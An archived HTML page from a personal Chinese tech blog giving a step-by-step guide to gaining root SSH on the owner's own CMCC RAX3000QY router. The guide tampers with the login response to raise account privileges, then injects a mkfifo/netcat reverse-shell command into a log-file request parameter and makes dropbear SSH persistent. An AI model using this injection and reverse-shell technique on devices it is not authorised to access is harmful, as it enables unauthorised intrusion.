@@ -1,0 +1,298 @@
+<!DOCTYPE html><html lang="zh_CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[折腾笔记]RAX3000QY开启SSH | 猎空のBlog</title><meta name="author" content="Lie_Kong"><meta name="copyright" content="Lie_Kong"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="破解CMCC定制机RAX3000QY,开启并固化SSH">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[折腾笔记]RAX3000QY开启SSH">
+<meta property="og:url" content="https://blog.lie-kong.top/posts/9aad8a2d/">
+<meta property="og:site_name" content="猎空のBlog">
+<meta property="og:description" content="破解CMCC定制机RAX3000QY,开启并固化SSH">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.lie-kong.top/pic/6854da89cfd22/4ed1115e44eb68d7694b46a6a95dc30c.webp">
+<meta property="article:published_time" content="2025-06-10T04:03:07.000Z">
+<meta property="article:modified_time" content="2025-07-30T16:24:04.415Z">
+<meta property="article:author" content="Lie_Kong">
+<meta property="article:tag" content="技术">
+<meta property="article:tag" content="Network">
+<meta property="article:tag" content="折腾">
+<meta property="article:tag" content="路由器">
+<meta property="article:tag" content="破解">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.lie-kong.top/pic/6854da89cfd22/4ed1115e44eb68d7694b46a6a95dc30c.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[折腾笔记]RAX3000QY开启SSH",
+  "url": "https://blog.lie-kong.top/posts/9aad8a2d/",
+  "image": "https://pic.lie-kong.top/pic/6854da89cfd22/4ed1115e44eb68d7694b46a6a95dc30c.webp",
+  "datePublished": "2025-06-10T04:03:07.000Z",
+  "dateModified": "2025-07-30T16:24:04.415Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Lie_Kong",
+      "url": "https://blog.lie-kong.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://pic.lie-kong.top/pic/683dc984109ea/5df3290f6193de522920d299cd9b22eb.ico"><link rel="canonical" href="https://blog.lie-kong.top/posts/9aad8a2d/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[折腾笔记]RAX3000QY开启SSH',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://avatars.githubusercontent.com/u/109675857?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/dn42"><i class="fa-fw fas fa-sitemap"></i><span> DN42</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://www.travellings.cn/go.html"><i class="fa-fw fas fa-train-subway"></i><span> 开往</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://pic.lie-kong.top/pic/6854da89cfd22/4ed1115e44eb68d7694b46a6a95dc30c.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">猎空のBlog</span></a><a class="nav-page-title" href="/"><span class="site-name">[折腾笔记]RAX3000QY开启SSH</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/dn42"><i class="fa-fw fas fa-sitemap"></i><span> DN42</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://www.travellings.cn/go.html"><i class="fa-fw fas fa-train-subway"></i><span> 开往</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">[折腾笔记]RAX3000QY开启SSH</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-06-10T04:03:07.000Z" title="Created 2025-06-10 12:03:07">2025-06-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-30T16:24:04.415Z" title="Updated 2025-07-31 00:24:04">2025-07-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/">折腾笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="umamiPV" data-path="/posts/9aad8a2d/"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1>
+<p>最近有了点闲钱以及时间,想把家里的网络升级一下,考虑到家里宽带仅仅是300兆的,用不到太好的路由器,在网上翻来翻去找到了一款我认为性价比极佳的路由器 ---- RAX3000QY</p>
+<h2 id="为什么说它性价比极佳"><a class="markdownIt-Anchor" href="#为什么说它性价比极佳"></a> 为什么说它性价比极佳?</h2>
+<p>RAX3000QY是一款中国移动的定制路由器,使用高通IPQ5000处理器,集成256MB内存,5G无线芯片型号为QCN6102,支持2x2mimo,在160MHz频宽下最高速率2402Mbps.最重要的是这台路由器,只需要30元包邮,还能免拆刷系统<br />
+<img src="https://pic.lie-kong.top/pic/68542b1af329c/6917dcec7053f4676bad799d6f7bf174.webp" alt="1000073448.webp" /><br />
+PS:具体拆解可以去<a target="_blank" rel="noopener" href="https://www.acwifi.net/18224.html">acwifi</a>看看</p>
+<h1 id="开始"><a class="markdownIt-Anchor" href="#开始"></a> 开始!</h1>
+<h2 id="准备的工具"><a class="markdownIt-Anchor" href="#准备的工具"></a> 准备的工具</h2>
+<ul>
+<li>
+<p>你的路由器</p>
+</li>
+<li>
+<p>一台电脑</p>
+</li>
+<li>
+<p>具有阅读能力的大脑</p>
+</li>
+<li>
+<p>双手</p>
+<p>电脑上需要两个软件:</p>
+<ol>
+<li>ProxyPin  <a target="_blank" rel="noopener" href="https://github.com/wanghongenpin/proxypin">地址</a></li>
+<li>netcat  <a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat">地址</a><br />
+<strong>这两个软件都是免费的!</strong></li>
+</ol>
+</li>
+</ul>
+<h2 id="壹-抓包修改权限"><a class="markdownIt-Anchor" href="#壹-抓包修改权限"></a> 壹 • 抓包修改权限</h2>
+<p>将你的路由器通电,把电脑和路由器连上(WIFI,网线都可以),打开ProxyPin和任意一个浏览器,输入 <code>http://192.168.10.1</code> 进入路由器的后台登陆界面<br />
+<img src="https://pic.lie-kong.top/pic/68543975f3345/d789238ea25a60a5a6d2c8494a46e847.webp" alt="屏幕截图 2025-06-12 222027.webp" /><br />
+输入路由器背面标签上的登录密码,点击登陆<br />
+<img src="https://pic.lie-kong.top/pic/685439761f640/4afa19dc0549c6b739919c1e226e3660.webp" alt="屏幕截图 2025-06-12 222127.webp" /><br />
+在ProxyPin左栏中找到<code>/items/login</code>,点击请求重写<br />
+<img src="https://pic.lie-kong.top/pic/68543a03c78d1/8a50389936ac16fa7f4b6e4da5ce223a.webp" alt="屏幕截图 2025-06-12 222213.webp" /><br />
+将 <code>行为</code> 改为 <code>修改响应</code><br />
+<img src="https://pic.lie-kong.top/pic/68543a04d2f48/003c12c71d1d5f5447875499284b6681.webp" alt="屏幕截图 2025-06-12 222327.webp" /><br />
+名称<code>account</code> 类型<code>修改Body</code> 修改<code>将&quot;3&quot;替换为&quot;1&quot;</code><br />
+<img src="https://pic.lie-kong.top/pic/68543a049d7eb/5356891cb130ba4e26f4cbb6e571efa0.webp" alt="屏幕截图 2025-06-12 222510.webp" /><br />
+保存后,退出,重新登陆路由器的后台登陆界面</p>
+<h2 id="贰-利用漏洞连接路由器"><a class="markdownIt-Anchor" href="#贰-利用漏洞连接路由器"></a> 贰 • 利用漏洞连接路由器</h2>
+<p>打开 管理-日志,将日志的开关打开,在ProxyPin中找到对应数据包<br />
+<img src="https://pic.lie-kong.top/pic/68543c253110f/6268b3bcc5d7ad8cb17ff18a8fa1433e.webp" alt="屏幕截图 2025-06-12 222726.webp" /><br />
+可以看到,我们的log也有输出在<code>HTML</code>内.<br />
+这时,在netcat文件夹中打开cmd,输入<code>nc -lvnp 4444</code><br />
+<img src="https://pic.lie-kong.top/pic/68543d9b1e552/ddd1212607e9661c929d2ac477804ab6.webp" alt="屏幕截图 2025-06-12 223013.webp" /><br />
+在刚刚打开的数据包中,点击请求重写,将 <code>行为</code> 改为 <code>替换请求</code><br />
+<img src="https://pic.lie-kong.top/pic/68543d9b7999f/8f04471e2adab162d82c0fe64474de1b.webp" alt="屏幕截图 2025-06-12 222758.webp" /><br />
+在.log后面加入<code>|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc ip地址 4444 &gt;/tmp/f</code>.<br />
+<img src="https://pic.lie-kong.top/pic/68543d9b30b26/ef62cbf11083b0dc64dc13a0fe89026d.webp" alt="屏幕截图 2025-06-12 223319.webp" /><br />
+保存刷新,就能在nc所在的cmd看到连接了<br />
+<img src="https://pic.lie-kong.top/pic/68543d9ade742/757173737a1ee1186da4d96b5f703c99.webp" alt="屏幕截图 2025-06-12 223034.webp" /></p>
+<h2 id="叁-在终端打开ssh"><a class="markdownIt-Anchor" href="#叁-在终端打开ssh"></a> 叁 • 在终端打开SSH</h2>
+<p>在刚才的cmd中,输入<code>passwd</code>,接着输入两次admin，更改root密码<br />
+<img src="https://pic.lie-kong.top/pic/68543f5b750e1/5991681cb6a158cf3c54e93dff6dcd75.webp" alt="屏幕截图 2025-06-12 223354.webp" /><br />
+接着,输入<code>$(dropbear$&#123;IFS&#125;-p$&#123;IFS&#125;22)</code>,打开22端口的SSHd<br />
+<img src="https://pic.lie-kong.top/pic/68543f5b804eb/bf3a2e817a4f16410b996bc12ec20380.webp" alt="屏幕截图 2025-06-12 223408.webp" /><br />
+最后再打开SSH工具，连接上192.168.10.1，就可以进入SSH了<br />
+<img src="https://pic.lie-kong.top/pic/68543fff7ec3d/96572270c32833464264dbb6c0cb9439.webp" alt="屏幕截图 2025-06-12 223506.webp" /></p>
+<div class="note info simple"><p><strong>小提示:</strong><br />
+如果要刷系统,到这里就可以去下一篇文章了</p>
+</div>
+<h2 id="肆-固化ssh"><a class="markdownIt-Anchor" href="#肆-固化ssh"></a> 肆 固化SSH</h2>
+<p>输入<code>vi /etc/config/dropbear</code>,进入页面后按下 <code>i</code>键,输入:</p>
+<pre class="highlight"><code class="">config dropbear
+    option PasswordAuth 'on'
+    option RootPasswordAuth 'on'
+    option Port         '22'
+    option enable       '1'
+</code></pre>
+<p>输入完成后按下<code>esc</code>,输入<code>:wq</code>,回车后即可返回终端<br />
+<img src="https://pic.lie-kong.top/pic/6854c09729c2b/06615cfd4919cd0c0691facd43cb869e.webp" alt="屏幕截图 2025-06-20 093536.webp" /><br />
+输入<code>/etc/init.d/dropbear enable</code>,令dropbear开机自启动<br />
+如此操作下来,SSH就固化了,重启后也不会掉</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://blog.lie-kong.top">Lie_Kong</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://blog.lie-kong.top/posts/9aad8a2d/">https://blog.lie-kong.top/posts/9aad8a2d/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8A%80%E6%9C%AF/">技术</a><a class="post-meta__tags" href="/tags/Network/">Network</a><a class="post-meta__tags" href="/tags/%E6%8A%98%E8%85%BE/">折腾</a><a class="post-meta__tags" href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/">路由器</a><a class="post-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a></div><div class="post-share"><div class="social-share" data-image="https://pic.lie-kong.top/pic/6854da89cfd22/4ed1115e44eb68d7694b46a6a95dc30c.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/9e71ef22/" title="[折腾笔记]RAX3000QY刷入Uboot和ImmortalWrt"><img class="cover" src="https://pic.lie-kong.top/pic/6854cb68d2ba3/0c4805be29d9da48fcfebae1c067609b.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">[折腾笔记]RAX3000QY刷入Uboot和ImmortalWrt</div></div><div class="info-2"><div class="info-item-1"> 前言 上篇文章中,我们解锁并固化了RAX3000QY的SSH,可玩性大大提高.但是原厂的后台可用功能太少了,所以决定直接刷一个ImmortalWrt进去 PS:ImmortalWrt是我测试的效果较好的一个固件,网上还有集客/Nwrt/Qwrt等系统可供选择,刷入Uboot后可以随便刷.  开刷!  准备的工具   你的路由器   一条网线   一台电脑   具有阅读能力的大脑   双手 固件我使用的是这个固件 Uboot是在Github上找到的,项目地址    刷入Uboot 连接上路由器,使用SSH或上篇文章中没关掉的netcat窗口都可以,我使用的是上篇文章的netcat窗口(如果只是刷系统可以不开ssh) 电脑端打开 WinSCP 软件 新建站点——文件协议选择scp——主机名就是路由器ip——输入用户名root和密码登录  把 Uboot项目中的nwrt_rax3000qy_uboot.mbn 与 nwrt_rax3000qy_mibib.bin 放到路由器 /tmp 文件夹下  进入路由器终端 输入如下两个命令： 12mtd write /tmp/nwrt_rax3...</div></div></div></a><a class="pagination-related" href="/posts/7ff16bf1/" title="Docker/Gcr/Ghcr公益镜像源上线"><img class="cover" src="https://pic.lie-kong.top/pic/68458653b96f5/5eb659cbba720fa895f40d509a21a979.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Docker/Gcr/Ghcr公益镜像源上线</div></div><div class="info-2"><div class="info-item-1"> 前言 由于某些原因，我们在中国大陆是无法拉去docker镜像的，在个人设备上我们可以使用科学上网来拉去镜像，但是在公司/云服务器上就不太好搞了，这个时候我们就需要镜像源。 因为手里的vps比较空闲，本人便搭建了一个镜像源方便大家使用。  镜像源如下    Platform Source Address     Hubcmd-UI None ui.lie-kong.top   Docker Hub docker.io hub.lie-kong.top   GitHub Container Registry gcr.io gcr.lie-kong.top   GitHub Container Registry ghcr.io ghcr.lie-kong.top    禁止将该镜像源进行滥用/以此谋利等行为，否则将永久关停  鸣谢：  </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/9e71ef22/" title="[折腾笔记]RAX3000QY刷入Uboot和ImmortalWrt"><img class="cover" src="https://pic.lie-kong.top/pic/6854cb68d2ba3/0c4805be29d9da48fcfebae1c067609b.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-11</div><div class="info-item-2">[折腾笔记]RAX3000QY刷入Uboot和ImmortalWrt</div></div><div class="info-2"><div class="info-item-1"> 前言 上篇文章中,我们解锁并固化了RAX3000QY的SSH,可玩性大大提高.但是原厂的后台可用功能太少了,所以决定直接刷一个ImmortalWrt进去 PS:ImmortalWrt是我测试的效果较好的一个固件,网上还有集客/Nwrt/Qwrt等系统可供选择,刷入Uboot后可以随便刷.  开刷!  准备的工具   你的路由器   一条网线   一台电脑   具有阅读能力的大脑   双手 固件我使用的是这个固件 Uboot是在Github上找到的,项目地址    刷入Uboot 连接上路由器,使用SSH或上篇文章中没关掉的netcat窗口都可以,我使用的是上篇文章的netcat窗口(如果只是刷系统可以不开ssh) 电脑端打开 WinSCP 软件 新建站点——文件协议选择scp——主机名就是路由器ip——输入用户名root和密码登录  把 Uboot项目中的nwrt_rax3000qy_uboot.mbn 与 nwrt_rax3000qy_mibib.bin 放到路由器 /tmp 文件夹下  进入路由器终端 输入如下两个命令： 12mtd write /tmp/nwrt_rax3...</div></div></div></a><a class="pagination-related" href="/posts/65d62b7b/" title="为BuyVM的Debian机添加IPv6"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-02</div><div class="info-item-2">为BuyVM的Debian机添加IPv6</div></div><div class="info-2"><div class="info-item-1"> 前言 最近整了台Netcup的VPS 1000 G11 SE，把主要的业务从BuyVM迁移到了NC上(毕竟配置高多了)。迁移完顺手把BuyVM重装成了Debian12，SSH上去发现v6没了，按照Ubuntu的配置方法失败，几经搜索成功加上了v6，为了防止忘记，就有了这篇文章。  解决方案  网站配置 登录 BuyVM 的控制台，点击需要添加IPv6的VPS后的Manage  然后进入网络配置的页面(Networking)  点击IPv6下的Assign IPv6 Address  随机生成一个IPv6地址，然后点Add IPv6 Address保存  不过 IPv6 地址不建议加太多(口子就那么大，搞多了也没用)，BuyVM 在这里贴出了一个警告  Warning! You can have a maximum of 16 IPv6 addresses. Please use the ‘Routed Subnet’ for unlimited IPv6 addresses.  翻译过来就是  警告！ 您最多可以有 16 个 IPv6 地址。请使用“路由子网”来获取无限的 IP...</div></div></div></a><a class="pagination-related" href="/posts/7ff16bf1/" title="Docker&#x2F;Gcr&#x2F;Ghcr公益镜像源上线"><img class="cover" src="https://pic.lie-kong.top/pic/68458653b96f5/5eb659cbba720fa895f40d509a21a979.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-08</div><div class="info-item-2">Docker&#x2F;Gcr&#x2F;Ghcr公益镜像源上线</div></div><div class="info-2"><div class="info-item-1"> 前言 由于某些原因，我们在中国大陆是无法拉去docker镜像的，在个人设备上我们可以使用科学上网来拉去镜像，但是在公司/云服务器上就不太好搞了，这个时候我们就需要镜像源。 因为手里的vps比较空闲，本人便搭建了一个镜像源方便大家使用。  镜像源如下    Platform Source Address     Hubcmd-UI None ui.lie-kong.top   Docker Hub docker.io hub.lie-kong.top   GitHub Container Registry gcr.io gcr.lie-kong.top   GitHub Container Registry ghcr.io ghcr.lie-kong.top    禁止将该镜像源进行滥用/以此谋利等行为，否则将永久关停  鸣谢：  </div></div></div></a><a class="pagination-related" href="/posts/f6ae78be/" title="Linux疑难杂症合集"><img class="cover" src="https://pic.lie-kong.top/pic/683be6bec75f4/721b9fb2ec83e9a9664bb4574cec67ea.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-29</div><div class="info-item-2">Linux疑难杂症合集</div></div><div class="info-2"><div class="info-item-1"> 前言 该文章用于记载一些本人在服务器部署过程中遇到的一些离谱的，网上无法直接搜到的问题与解决方案 文章不定时更新   Docker    错误现象：docker安装完成后，启动报错docker: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? 复现方法：安装纯净Debian12 解决方法：sudo groupadd docker  #创建一个名为docker的组 sudo usermod -aG docker $USER  #将当前用户加入 docker 组    </div></div></div></a><a class="pagination-related" href="/posts/12f745de/" title="低价订阅Termius Pro，年付不到20CNY！"><img class="cover" src="https://pic.lie-kong.top/pic/683be6b2e3fe1/fd3ba13a3289f549079211b10c64f2d4.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-30</div><div class="info-item-2">低价订阅Termius Pro，年付不到20CNY！</div></div><div class="info-2"><div class="info-item-1"> 前言 Windows 上的 SSH 工具很多，像是老牌的 XShell、FinalShell、MobaXterm，或者是新秀 Electerm，功能上它们都非常的完善，但是与 Termius 相比，都少了跨平台与云同步两个特性。尽管有软件能够同时支持 Windows、macOS、Linux，但它们都没有移动端，而 Termius 不仅在PC端通用，在PE端也能通用。 订阅 Pro版 之后，就可以使用云同步了，大大方便了设备的迁移。众所周知，国外软件直接订阅的价格通常是比较昂贵的，Termius 也是如此，官网订阅的价格高达 10 美元每月，令人望而却步。最近听闻土区仅需20CNY/年，我便来实操体验一下。  开始操作！  充值TRY  更改账号地址 首先需要前往 Microsoft 账户将国家或地区修改为土耳其(红框中)  购买礼品卡 去某宝/某鱼购买xbox土区礼品卡(我买的100TRY,花了20CNY) 连接你的土耳其节点 前往礼品卡兑换页面，将购买到的礼品卡填入其中，确保上面显示的是土耳其(红框中)   5.兑换成功后，账号余额会有 100 里拉   订阅Termius ...</div></div></div></a><a class="pagination-related" href="/posts/34960/" title="DN42 从入坑到放弃 - Part1 加入DN42"><img class="cover" src="https://pic.lie-kong.top/pic/683be6ccf0997/79f883440af0ce3999f455b2de0a9c34.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-02</div><div class="info-item-2">DN42 从入坑到放弃 - Part1 加入DN42</div></div><div class="info-2"><div class="info-item-1">警告： 本人只是一名高三学生，在此之前对于BGP等技术一无所知，因此，本文可能包含但不限于 笔误/错误/小白理解 请大佬勿喷，如果能指正出来那就更好啦  再次警告： 如果您能接受的话，可以继续看下去，如果不能接受，建议现在就关闭此文章    前言  为什么要入坑DN42？ 出于对于未来职业可能的考虑，以及对于技术的好奇，我开始在网上搜索关于BGP/Anycast的相关知识，但是为了国际互联网的安全 其实是ASN/服务器太贵了 ，决定先入坑DN42练好技术再上真货 也可能不上了就  什么是DN42？  dn42是一个大型的动态VPN，它采用了互联网技术（BGP、whois数据库、DNS等）。参与者使用网络隧道（GRE、OpenVPN、WireGuard、Tinc、IPsec）相互连接，并通过边界网关协议（Border Gateway Protocol）交换路由。网络地址分配在 172.20.0.0/14 范围内，并使用私有AS号（参见registry），以及使用ULA范围（fd00::/8）的IPv6地址。 ——引用自 DN42 Wiki  DN42的初衷是为互联网工作者提供一个用...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/109675857?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Lie_Kong</div><div class="author-info-description">一只狼龙的仓库</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Lie-Kong"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%AF%B4%E5%AE%83%E6%80%A7%E4%BB%B7%E6%AF%94%E6%9E%81%E4%BD%B3"><span class="toc-number">1.1.</span> <span class="toc-text"> 为什么说它性价比极佳?</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 